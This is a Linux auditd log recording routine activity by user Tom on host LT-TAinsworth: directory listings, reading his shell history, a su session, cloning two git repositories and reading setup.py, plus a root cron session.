type=PATH msg=audit(1789480118.337:320): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789480118.337:320): proctitle=6C73002D2D636F6C6F723D6175746F002D6C61
type=SYSCALL msg=audit(1789480129.221:321): arch=c000003e syscall=59 success=yes exit=0 a0=5616598cf410 a1=561659845f80 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1422 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="cat" exe="/usr/bin/cat" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789480129.221:321): argc=2 a0="cat" a1=".bash_history"
type=CWD msg=audit(1789480129.221:321): cwd="/home/Tom"
type=PATH msg=audit(1789480129.221:321): item=0 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789480129.221:321): item=1 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789480129.221:321): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789480129.221:321): proctitle=636174002E626173685F686973746F7279
type=SYSCALL msg=audit(1789480160.181:322): arch=c000003e syscall=59 success=yes exit=0 a0=5616598d65c0 a1=5616598d0c80 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1431 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="cat" exe="/usr/bin/cat" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789480160.181:322): argc=2 a0="cat" a1=".bash_history"
type=CWD msg=audit(1789480160.181:322): cwd="/home/Tom"
type=PATH msg=audit(1789480160.181:322): item=0 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789480160.181:322): item=1 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789480160.181:322): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789480160.181:322): proctitle=636174002E626173685F686973746F7279
type=SYSCALL msg=audit(1789480163.389:323): arch=c000003e syscall=59 success=yes exit=0 a0=5616599114d0 a1=561659909e70 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1432 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789480163.389:323): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789480163.389:323): cwd="/home/Tom"
type=PATH msg=audit(1789480163.389:323): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789480163.389:323): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789480163.389:323): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789480163.389:323): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789481718.732:324): arch=c000003e syscall=59 success=yes exit=0 a0=561659912430 a1=561659909ee0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1441 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="su" exe="/usr/bin/su" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481718.732:324): argc=1 a0="su"
type=CWD msg=audit(1789481718.732:324): cwd="/home/Tom"
type=PATH msg=audit(1789481718.732:324): item=0 name="/usr/bin/su" inode=391780 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481718.732:324): item=1 name="/usr/bin/su" inode=391780 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481718.732:324): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481718.732:324): proctitle="su"
type=USER_AUTH msg=audit(1789481722.200:325): pid=1441 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789481722.200:326): pid=1441 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_ACQ msg=audit(1789481722.200:327): pid=1441 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789481722.204:328): pid=1441 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_unix,pam_systemd acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789481738.948:329): pid=1441 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_unix,pam_systemd acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789481738.948:330): pid=1441 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789481748.460:331): arch=c000003e syscall=59 success=yes exit=0 a0=561659912430 a1=5616598cfdf0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1448 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481748.460:331): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789481748.460:331): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481748.460:331): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481748.460:331): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481748.460:331): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481748.460:331): proctitle=6C73002D2D636F6C6F723D6175746F
type=USER_ACCT msg=audit(1789481821.324:332): pid=1451 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789481821.324:333): pid=1451 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789481821.328:334): pid=1451 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=28 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789481821.328:334): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1451 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=28 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789481821.328:334): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789481821.328:335): pid=1451 uid=0 auid=0 ses=28 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789481821.328:336): pid=1452 uid=0 auid=0 ses=28 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789481821.332:337): pid=1451 uid=0 auid=0 ses=28 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789481821.332:338): pid=1451 uid=0 auid=0 ses=28 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SYSCALL msg=audit(1789481839.980:339): arch=c000003e syscall=59 success=yes exit=0 a0=5616598a8990 a1=561659915a70 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1454 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/bin/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481839.980:339): argc=5 a0="git" a1="clone" a2="--depth" a3="1" a4="https://github.com/mplewis/csvtomd.git"
type=CWD msg=audit(1789481839.980:339): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481839.980:339): item=0 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481839.980:339): item=1 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481839.980:339): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481839.980:339): proctitle=67697400636C6F6E65002D2D646570746800310068747470733A2F2F6769746875622E636F6D2F6D706C657769732F637376746F6D642E676974
type=SYSCALL msg=audit(1789481840.032:340): arch=c000003e syscall=59 success=yes exit=0 a0=55b894074bf0 a1=55b894074a98 a2=55b894075120 a3=7f9d5c7c0b28 items=3 ppid=1454 pid=1455 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481840.032:340): argc=4 a0="/usr/lib/git-core/git" a1="remote-https" a2="origin" a3="https://github.com/mplewis/csvtomd.git"
type=CWD msg=audit(1789481840.032:340): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481840.032:340): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481840.032:340): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481840.032:340): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481840.032:340): proctitle=2F7573722F6C69622F6769742D636F72652F6769740072656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6D706C657769732F637376746F6D642E676974
type=SYSCALL msg=audit(1789481840.052:341): arch=c000003e syscall=59 success=yes exit=0 a0=5555a0a08e70 a1=5555a0a08d68 a2=5555a0a09930 a3=7f443a766b28 items=3 ppid=1455 pid=1456 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git-remote-http" exe="/usr/lib/git-core/git-remote-http" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481840.052:341): argc=3 a0="/usr/lib/git-core/git-remote-https" a1="origin" a2="https://github.com/mplewis/csvtomd.git"
type=CWD msg=audit(1789481840.052:341): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481840.052:341): item=0 name="/usr/lib/git-core/git-remote-https" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481840.052:341): item=1 name="/usr/lib/git-core/git-remote-https" inode=427670 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481840.052:341): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481840.052:341): proctitle=2F7573722F6C69622F6769742D636F72652F6769742D72656D6F74652D6874747073006F726967696E0068747470733A2F2F6769746875622E636F6D2F6D706C657769732F637376746F6D642E676974
type=SYSCALL msg=audit(1789481840.836:342): arch=c000003e syscall=59 success=yes exit=0 a0=55b894078880 a1=55b894077758 a2=55b894077400 a3=7f9d5c7c0b28 items=3 ppid=1454 pid=1459 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481840.836:342): argc=8 a0="/usr/lib/git-core/git" a1="--shallow-file" a2="/home/Tom/Projects/csvtomd/.git/shallow.lock" a3="index-pack" a4="--stdin" a5="-v" a6="--fix-thin" a7=2D2D6B6565703D66657463682D7061636B2031343534206F6E204C542D5441696E73776F727468
type=CWD msg=audit(1789481840.836:342): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481840.836:342): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481840.836:342): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481840.836:342): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481840.836:342): proctitle=2F7573722F6C69622F6769742D636F72652F676974002D2D7368616C6C6F772D66696C65002F686F6D652F546F6D2F50726F6A656374732F637376746F6D642F2E6769742F7368616C6C6F772E6C6F636B00696E6465782D7061636B002D2D737464696E002D76002D2D6669782D7468696E002D2D6B6565703D66657463682D
type=SYSCALL msg=audit(1789481840.864:343): arch=c000003e syscall=59 success=yes exit=0 a0=55b8940791f0 a1=55b894077338 a2=55b894077400 a3=7f9d5c7c0b28 items=3 ppid=1454 pid=1462 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481840.864:343): argc=9 a0="/usr/lib/git-core/git" a1="rev-list" a2="--objects" a3="--stdin" a4="--not" a5="--all" a6="--quiet" a7="--alternate-refs" a8=2D2D70726F67726573733D436865636B696E6720636F6E6E6563746976697479
type=CWD msg=audit(1789481840.864:343): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481840.864:343): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481840.864:343): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481840.864:343): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481840.864:343): proctitle=2F7573722F6C69622F6769742D636F72652F676974007265762D6C697374002D2D6F626A65637473002D2D737464696E002D2D6E6F74002D2D616C6C002D2D7175696574002D2D616C7465726E6174652D72656673002D2D70726F67726573733D436865636B696E6720636F6E6E6563746976697479
type=SYSCALL msg=audit(1789481843.748:344): arch=c000003e syscall=59 success=yes exit=0 a0=5616597db670 a1=561659913930 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1463 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481843.748:344): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789481843.748:344): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481843.748:344): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481843.748:344): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481843.748:344): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481843.748:344): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789481851.036:345): arch=c000003e syscall=59 success=yes exit=0 a0=5616598b7010 a1=561659905e40 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1466 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481851.036:345): argc=3 a0="ls" a1="--color=auto" a2="-la"
type=CWD msg=audit(1789481851.036:345): cwd="/home/Tom/Projects/csvtomd"
type=PATH msg=audit(1789481851.036:345): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481851.036:345): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481851.036:345): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481851.036:345): proctitle=6C73002D2D636F6C6F723D6175746F002D6C61
type=SYSCALL msg=audit(1789481865.248:346): arch=c000003e syscall=59 success=yes exit=0 a0=5616598d1fa0 a1=561659900190 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1473 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="cat" exe="/usr/bin/cat" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481865.248:346): argc=2 a0="cat" a1="setup.py"
type=CWD msg=audit(1789481865.248:346): cwd="/home/Tom/Projects/csvtomd"
type=PATH msg=audit(1789481865.248:346): item=0 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481865.248:346): item=1 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481865.248:346): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481865.248:346): proctitle=6361740073657475702E7079
type=SYSCALL msg=audit(1789481943.748:347): arch=c000003e syscall=59 success=yes exit=0 a0=5616598d0d70 a1=56165990b3d0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1475 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/bin/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481943.748:347): argc=3 a0="git" a1="clone" a2="http://devforge.internal:3000/diogenes/diogenes-breakroom-roster.git"
type=CWD msg=audit(1789481943.748:347): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481943.748:347): item=0 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.748:347): item=1 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.748:347): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
